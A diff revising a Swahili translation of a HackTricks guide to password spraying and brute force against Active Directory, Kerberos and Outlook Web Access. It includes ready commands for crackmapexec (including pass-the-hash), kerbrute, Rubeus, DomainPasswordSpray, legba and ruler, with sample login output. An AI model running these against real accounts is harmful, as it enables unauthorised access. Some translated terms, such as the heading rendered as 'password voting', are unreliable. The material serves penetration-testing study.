@@ -1,31 +1,31 @@
-# Kupuliza Nywila / Brute Force
+# Kupiga Kura ya Nywila / Brute Force
 
 <details>
 
-<summary><strong>Jifunze kuhusu kuhack AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalamu wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kuhack kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
-## **Kupuliza Nywila**
+## **Kupiga Kura ya Nywila**
 
-Baada ya kupata **majina ya mtumiaji halali** kadhaa, unaweza kujaribu **nywila za kawaida** (kumbuka sera ya nywila ya mazingira) kwa kila mtumiaji uliogundua.\
-Kwa **chaguo-msingi**, **urefu** **wa chini** wa **nywila** ni **7**.
+Baada ya kupata **majina ya mtumiaji halali kadhaa** unaweza kujaribu **nywila za kawaida zaidi** (zingatia sera ya nywila ya mazingira) kwa kila mtumiaji uliyegundua.\
+Kwa **kawaida** **urefu** wa **chini** wa **nywila** ni **7**.
 
-Orodha ya majina ya mtumiaji ya kawaida inaweza kuwa na manufaa pia: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+Orodha za majina ya mtumiaji wa kawaida zinaweza kuwa na manufaa pia: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Tambua kuwa **unaweza kufunga akaunti kadhaa ikiwa unajaribu nywila zisizo sahihi** (kwa chaguo-msingi zaidi ya 10).
+Tambua kwamba **unaweza kufunga akaunti kadhaa ikiwa unajaribu nywila zisizo sahihi** (kwa kawaida zaidi ya 10).
 
 ### Pata sera ya nywila
 
-Ikiwa una baadhi ya sifa za mtumiaji au kikao kama mtumiaji wa kikoa unaweza **pata sera ya nywila kwa**:
+Ikiwa una siri za mtumiaji au unatumia kama mtumiaji wa kikoa unaweza **pata sera ya nywila na**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -42,9 +42,9 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### Uchimbaji kutoka kwa Linux (au yote)
+### Kutumia **crackmapexec:**
 
-* Kutumia **crackmapexec:**
+- **crackmapexec** ni zana ya kipekee ya kuchunguza na kushambulia mifumo ya Windows Active Directory.
 ```bash
 crackmapexec smb <IP> -u users.txt -p passwords.txt
 # Local Auth Spray (once you found some local admin pass or hash)
@@ -62,16 +62,16 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-* Kutumia [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - HAIPENDEKEZWI MARA NYINGINE HAIFANYI KAZI
+* Kutumia [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - SIYOPENDEKEZWI MARA NYINGINE HAIFANYI KAZI
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-* Kwa kutumia moduli ya `scanner/smb/smb_login` ya **Metasploit**:
+* Kwa moduli ya `scanner/smb/smb_login` ya **Metasploit**:
 
-![](<../../.gitbook/assets/image (132) (1).png>)
+![](<../../.gitbook/assets/image (742).png>)
 
-* Kwa kutumia **rpcclient**:
+* Kutumia **rpcclient**:
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
 for u in $(cat users.txt); do
@@ -80,7 +80,7 @@ done
 ```
 #### Kutoka kwa Windows
 
-* Kwa [Rubeus](https://github.com/Zer1t0/Rubeus) toleo lenye moduli ya kuvunja nguvu:
+* Kwa [Rubeus](https://github.com/Zer1t0/Rubeus) toleo lenye moduli ya kufanya nguvu:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -88,7 +88,7 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-* Kwa kutumia [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Inaweza kuzalisha watumiaji kutoka kwenye kikoa kwa chaguo-msingi na itapata sera ya nenosiri kutoka kwenye kikoa na kikomo cha majaribio kulingana na hiyo):
+* Kwa [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Inaweza kuzalisha watumiaji kutoka kwa kikoa kwa chaguo-msingi na itapata sera ya nenosiri kutoka kwa kikoa na kikomo cha majaribio kulingana nayo):
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
@@ -96,25 +96,23 @@ Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 Invoke-SprayEmptyPassword
 ```
-## Kuvunja Kwa Nguvu
+## Kujaribu Kwa Nguvu
 
 {% code overflow="wrap" %}
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
-{% endcode %}
-
 ## Kufikia Barua pepe ya Outlook
 
-Kuna zana nyingi za kufanya **spraying ya nenosiri la Outlook**.
+Kuna zana nyingi za **kupulizia nywila kwenye Outlook**.
 
 * Kwa kutumia [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/)
-* Kwa kutumia [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)
+* kwa kutumia [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)
 * Kwa kutumia [Ruler](https://github.com/sensepost/ruler) (imara!)
 * Kwa kutumia [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
 * Kwa kutumia [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-Ili kutumia zana yoyote hizi, unahitaji orodha ya watumiaji na nenosiri / orodha ndogo ya nenosiri za kufanya spraying.
+Ili kutumia zana yoyote hizi, unahitaji orodha ya watumiaji na nywila / orodha ndogo ya nywila za kupulizia.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
@@ -137,7 +135,7 @@ Ili kutumia zana yoyote hizi, unahitaji orodha ya watumiaji na nenosiri / orodha
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
 * [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
-* [www.blackhillsinfosec.com/?p=5296](www.blackhillsinfosec.com/?p=5296)
+* [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 * [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
 
 <details>
@@ -146,10 +144,10 @@ Ili kutumia zana yoyote hizi, unahitaji orodha ya watumiaji na nenosiri / orodha
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
